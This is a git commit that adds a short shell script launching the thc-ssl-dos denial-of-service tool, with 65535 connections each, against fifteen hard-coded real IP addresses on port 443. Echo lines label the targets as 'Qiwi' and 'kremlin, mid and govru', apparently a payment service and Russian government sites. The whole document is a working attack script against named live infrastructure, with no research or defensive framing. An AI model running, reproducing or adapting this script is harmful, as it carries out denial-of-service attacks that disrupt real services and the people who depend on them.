f4828cd47a277e1862f860086ef682658da953cf
ds <48093199+dannysilence@users.noreply.github.com>
2022-03-30 14:51:18 +0300

    Create runit_ssl.sh

---
+++ runit_ssl.sh
@@ -0,0 +1,18 @@
+echo 'Qiwi'
+thc-ssl-dos 65535 91.232.230.40 443 --accept &
+thc-ssl-dos 65535 91.232.230.50 443 --accept &
+thc-ssl-dos 65535 91.232.230.126 443 --accept &
+thc-ssl-dos 65535 91.232.230.135 443 --accept &
+thc-ssl-dos 65535 91.232.230.139 443 --accept &
+thc-ssl-dos 65535 91.232.230.165 443 --accept &
+thc-ssl-dos 65535 91.232.230.202 443 --accept &
+
+echo 'kremlin, mid and govru'
+thc-ssl-dos 65535 95.173.136.72 443 --accept &
+thc-ssl-dos 65535 94.85.30.210 443 --accept &
+thc-ssl-dos 65535 95.173.157.11 443 --accept &
+thc-ssl-dos 65535 95.173.157.26 443 --accept &
+thc-ssl-dos 65535 212.164.137.119 443 --accept &
+thc-ssl-dos 65535 195.80.224.185 443 --accept &
+thc-ssl-dos 65535 178.248.237.91 443 --accept &
+thc-ssl-dos 65535 89.208.226.50 443 --accept &
